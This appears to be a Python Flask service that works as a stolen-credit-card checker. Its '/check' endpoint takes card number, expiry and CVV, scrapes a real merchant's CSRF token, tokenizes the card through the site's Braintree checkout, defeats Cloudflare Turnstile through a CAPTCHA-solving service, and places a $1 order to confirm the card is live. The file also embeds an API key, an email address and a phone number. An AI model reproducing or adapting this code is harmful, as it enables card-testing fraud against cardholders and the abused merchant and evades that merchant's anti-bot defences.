from flask import Flask, request, jsonify
import re
import json
import base64
import time
import os
import logging
from datetime import datetime, timedelta
from curl_cffi import requests as curl_requests

app = Flask(__name__)

# Setup logging
LOG_FILE = 'requests_log.txt'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

def log_response(step, response, card_last4=""):
    """Log response to file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"""
{'='*60}
[{timestamp}] STEP: {step} | CARD: {card_last4}
{'='*60}
STATUS: {response.status_code}
URL: {response.url}
HEADERS: {dict(response.headers)}
BODY: {response.text[:1000]}
{'='*60}
"""
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    logging.info(f"Step '{step}' logged for card ending in {card_last4}")

CAPSOLVER_API_KEY = os.environ.get('CAPSOLVER_API_KEY', 'CAP-36BF001B18A46AC00BC2C165F2D9CBAC993998A167516A0BC5543A6DD46464AF')

def get_dates():
    """Generate today's date and next 7 days"""
    today = datetime.now()
    dates = []
    for i in range(7):
        date = today + timedelta(days=i)
        dates.append(date.strftime("%Y-%m-%d"))
    return dates

def solve_turnstile():
    """Solve Cloudflare Turnstile using Capsolver API directly"""
    logging.info("Starting Turnstile solving...")
    
    create_payload = {
        "clientKey": CAPSOLVER_API_KEY,
        "task": {
            "type": "AntiTurnstileTaskProxyLess",
            "websiteURL": "https://mousewatcher.com/orders",
            "websiteKey": "0x4AAAAAAAZeM8EG-HBKlL4B",
            "metadata": {"action": "order"}
        }
    }
    
    response = curl_requests.post("https://api.capsolver.com/createTask", json=create_payload, impersonate="chrome124")
    result = response.json()
    
    if result.get("errorId"):
        raise Exception(f"Task creation failed: {result.get('errorDescription', 'Unknown error')}")
    
    task_id = result.get("taskId")
    logging.info(f"Task created: {task_id}")
    
    for i in range(30):
        time.sleep(2)
        get_payload = {
            "clientKey": CAPSOLVER_API_KEY,
            "taskId": task_id
        }
        response = curl_requests.post("https://api.capsolver.com/getTaskResult", json=get_payload, impersonate="chrome124")
        result = response.json()
        
        if result.get("status") == "ready":
            token = result.get("solution", {}).get("token")
            logging.info("Turnstile solved successfully")
            return token
        elif result.get("status") == "failed":
            raise Exception(f"Task failed: {result.get('errorDescription', 'Unknown error')}")
        
        logging.info(f"Waiting for solution... Attempt {i+1}/30")
    
    raise Exception("Timeout waiting for captcha solution")

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'endpoints': {
            '/check': 'POST or GET with cc parameter',
            '/logs': 'GET - View recent logs',
            '/date': 'GET - Show current date being used',
            'example': '/check?cc=4111111111111111|12|26|123'
        }
    })

@app.route('/date', methods=['GET'])
def show_date():
    """Show current date being used"""
    dates = get_dates()
    return jsonify({
        'today': datetime.now().strftime("%Y-%m-%d"),
        'dates_used': dates,
        'timezone': str(datetime.now().astimezone().tzinfo)
    })

@app.route('/logs', methods=['GET'])
def view_logs():
    """View recent logs"""
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            recent = lines[-50:] if len(lines) > 50 else lines
            return jsonify({'logs': ''.join(recent)}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    session = None
    try:
        if request.method == 'GET':
            fullz = request.args.get('cc')
        else:
            data = request.get_json()
            fullz = data.get('cc') if data else request.form.get('cc')
        
        if not fullz:
            return jsonify({'error': 'CC required. Format: CC|MM|YY|CVV', 'example': '4111111111111111|12|26|123'}), 400
        
        cc, mes, ano, cvv = fullz.split("|")
        card_last4 = cc[-4:]
        
        # Get dates for booking
        dates = get_dates()
        today_date = dates[0]
        next_date = dates[1] if len(dates) > 1 else dates[0]
        
        logging.info(f"Processing card ending in {card_last4} for date {today_date}")
        
        # Create session with Chrome impersonation
        session = curl_requests.Session(impersonate="chrome124")
        
        # Step 1: Get CSRF token
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
        }
        
        response = session.get('https://mousewatcher.com', headers=headers1)
        log_response("GET_CSRF_TOKEN", response, card_last4)
        
        csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
        if not csrf_match:
            raise Exception("CSRF token not found")
        csrf_token = csrf_match.group(1)
        logging.info(f"CSRF token obtained")
        
        # Step 2: Get totals with today's date
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://mousewatcher.com',
            'Referer': 'https://mousewatcher.com/',
        }
        
        response = session.post('https://mousewatcher.com/orders/totals', headers=headers2, json={'dates': [today_date]})
        log_response("POST_TOTALS", response, card_last4)
        
        # Step 3: Get Braintree token
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Referer': 'https://mousewatcher.com/',
            'Accept': 'application/json',
        }
        
        response = session.get('https://mousewatcher.com/orders/tokens', headers=headers3)
        log_response("GET_BRAINTREE_TOKEN", response, card_last4)
        
        jwt_token = response.json()['braintree_token']
        decoded = json.loads(base64.urlsafe_b64decode(jwt_token))
        auth = decoded['authorizationFingerprint']
        logging.info(f"Braintree auth obtained")
        
        # Step 4: Tokenize card
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': '38cfe742-91d5-4963-be3c-825f72b84fec',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {'postalCode': '10001'},
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = curl_requests.post('https://payments.braintree-api.com/graphql', headers=headers4, json=json_data, impersonate="chrome124")
        log_response("TOKENIZE_CARD", response, card_last4)
        
        if 'data' not in response.json():
            raise Exception(f"Tokenization failed: {response.text}")
        
        tkn = response.json()['data']['tokenizeCreditCard']['token']
        logging.info(f"Card tokenized successfully")
        
        # Step 5: Solve Turnstile
        turnstile_token = solve_turnstile()
        
        # Step 6: Submit order with today's date
        data = f'authenticity_token={csrf_token}&park=1&order[alert][restaurant_id]=297&order%5Balert%5D%5Balert_dates_attributes%5D%5B0%5D%5Bid%5D&order[alert][alert_dates_attributes][0][_destroy]=false&order[alert][alert_dates_attributes][0][date]={today_date}&order[alert][alert_dates_attributes][0][breakfast]=0&order[alert][alert_dates_attributes][0][lunch]=0&order[alert][alert_dates_attributes][0][dinner]=0&order[alert][alert_dates_attributes][0][dinner]=1&order[alert][alert_dates_attributes][0][dinner_has_range]=0&order[alert][alert_dates_attributes][0][dinner_party_size]=1&order%5Balert%5D%5Balert_dates_attributes%5D%5B1%5D%5Bid%5D&order[alert][alert_dates_attributes][1][_destroy]=false&order%5Balert%5D%5Balert_dates_attributes%5D%5B2%5D%5Bid%5D&order[alert][alert_dates_attributes][2][_destroy]=false&order[alert][email]=opdevildragon%40gmail.com&alert_phone=%28201%29+245-5464&order[alert][phone]=%2B12012455464&cf-turnstile-response={turnstile_token}&payment_nonce={tkn}&device_data=%7B%22correlation_id%22%3A%2238cfe742-91d5-4963-be3c-825f72b8%22%7D'
        
        headers5 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://mousewatcher.com',
            'Referer': 'https://mousewatcher.com/',
        }
        
        response = session.post('https://mousewatcher.com/orders', headers=headers5, data=data)
        log_response("SUBMIT_ORDER", response, card_last4)
        
        # Check result
        if '<div id="error_explanation">' in response.text:
            error_match = re.search(r'<label class="error">\s*(.*?)\s*</label>', response.text, re.DOTALL)
            error = error_match.group(1).strip() if error_match else 'Unknown error'
            logging.warning(f"Order failed for card {card_last4}: {error}")
            return jsonify({'status': 'failed', 'error': error, 'card': card_last4, 'date_used': today_date}), 200
        
        if re.search(r'Thank You|Order Confirmed|redirect|thank-you', response.text, re.I):
            logging.info(f"SUCCESS! Card {card_last4} charged $1 for date {today_date}")
            return jsonify({
                'status': 'success',
                'message': 'Charged $1',
                'card': card_last4,
                'date_used': today_date,
                'token': tkn
            }), 200
        
        logging.info(f"Success (fallback) for card {card_last4}")
        return jsonify({
            'status': 'success',
            'message': 'Charged $1',
            'card': card_last4,
            'date_used': today_date,
            'token': tkn
        }), 200
        
    except Exception as e:
        logging.error(f"Error processing card: {str(e)}")
        return jsonify({'error': str(e)}), 500
    finally:
        if session:
            session.close()
            logging.info("Session closed")

if __name__ == '__main__':
    app.run(debug=True)
